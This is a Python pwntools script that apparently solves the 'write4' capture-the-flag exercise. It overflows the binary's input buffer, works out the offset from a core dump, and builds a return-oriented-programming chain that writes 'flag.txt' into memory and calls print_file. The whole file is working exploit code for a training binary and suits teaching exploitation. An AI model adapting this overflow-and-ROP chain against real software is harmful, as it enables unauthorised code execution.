#!/usr/bin/env python3

from pwn import *

exe = ELF("write4_patched")
libc = ELF("libwrite4.so")

context.binary = exe
rop = ROP(exe)

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    # good luck pwning :)

    payload = cyclic(100)
    r.sendlineafter(b'>', payload)
    r.wait()
    core = r.corefile
    stack = core.rsp
    eipval = core.read(stack, 4)
    offset = cyclic_find(eipval)

    r = conn()
    popgad = rop.find_gadget(["pop r14", "pop r15", "ret"])[0]
    payload = flat(b'A'*offset, popgad, exe.symbols.data_start, b'flag.txt', exe.symbols.usefulGadgets, rop.rdi.address, exe.symbols.data_start,exe.symbols.print_file)
    
    r.sendlineafter(b'>', payload)
    r.recvuntil('you!\n')
    flag = r.recvline()
    print(flag)

if __name__ == "__main__":
    main()
